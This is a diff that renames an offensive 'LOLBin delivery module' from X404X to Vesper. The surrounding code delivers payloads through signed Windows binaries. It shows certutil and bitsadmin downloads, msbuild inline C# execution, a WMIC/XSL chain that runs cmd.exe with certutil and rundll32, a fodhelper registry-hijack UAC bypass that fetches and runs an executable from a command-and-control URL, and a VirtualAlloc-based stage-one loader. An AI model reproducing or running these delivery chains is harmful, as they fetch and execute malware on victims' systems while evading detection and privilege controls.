@@ -1,4 +1,4 @@
-"""X404X LOLBin Delivery Module
+"""Vesper LOLBin Delivery Module
 Living Off the Land — delivers payloads using only signed Microsoft/signed binaries.
 No custom EXEs written to disk. 100%% LOLBin chain.
 All techniques are documented real-world LOLBin usage patterns.
@@ -14,7 +14,7 @@ from typing import Optional
 def deliver_certutil(url: str, output_path: Optional[str] = None) -> dict:
     """Download payload via certutil.exe. No PowerShell, no custom HTTP client."""
     if not output_path:
-        output_path = os.path.join(tempfile.gettempdir(), "x404x_payload.dll")
+        output_path = os.path.join(tempfile.gettempdir(), "vesper_payload.dll")
 
     cmd = f'certutil.exe -urlcache -split -f "{url}" "{output_path}"'
     result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
@@ -54,7 +54,7 @@ def deliver_regsvr32(url: str) -> dict:
 def deliver_msbuild(xml_payload: str) -> dict:
     """Execute C# payload inline via msbuild.exe. No DLL on disk."""
     msbuild_xml = f"""<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <Target Name="X404X">
+  <Target Name="Vesper">
     <ClassExample />
   </Target>
   <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory"
@@ -107,7 +107,7 @@ def deliver_wmic(url: str) -> dict:
 <output method="text"/>
 <template match="/">
 <eval>new ActiveXObject("WScript.Shell").Run(
-  "cmd.exe /c certutil -urlcache -f {url} %TEMP%\\x404x.dll && rundll32.exe %TEMP%\\x404x.dll,EntryPoint",
+  "cmd.exe /c certutil -urlcache -f {url} %TEMP%\\vesper.dll && rundll32.exe %TEMP%\\vesper.dll,EntryPoint",
   0, true
 );</eval>
 </template>
@@ -144,9 +144,9 @@ def deliver_powershell_encoded(command: str) -> dict:
 def deliver_bitsadmin(url: str, output_path: Optional[str] = None) -> dict:
     """Download via bitsadmin.exe (BITS). System-trusted, low footprint."""
     if not output_path:
-        output_path = os.path.join(tempfile.gettempdir(), "x404x_payload.exe")
+        output_path = os.path.join(tempfile.gettempdir(), "vesper_payload.exe")
 
-    job_name = f"x404x_{os.urandom(4).hex()}"
+    job_name = f"vesper_{os.urandom(4).hex()}"
 
     cmds = [
         f'bitsadmin.exe /create /download {job_name}',
@@ -191,7 +191,7 @@ def deliver_fodhelper(c2_url: str) -> dict:
     """UAC bypass via fodhelper.exe registry hijack. No admin required."""
     cmds = [
         'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /d "" /f',
-        f'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /t REG_SZ /d "cmd.exe /c start /min certutil -urlcache -f {c2_url} %TEMP%\\x404x.exe && %TEMP%\\x404x.exe" /f',
+        f'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /t REG_SZ /d "cmd.exe /c start /min certutil -urlcache -f {c2_url} %TEMP%\\vesper.exe && %TEMP%\\vesper.exe" /f',
         'fodhelper.exe',
     ]
 
@@ -232,7 +232,7 @@ using System.IO;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 
-public class X404X_Stage1 {
+public class VESPER_Stage1 {
     [DllImport("kernel32.dll")]
     static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
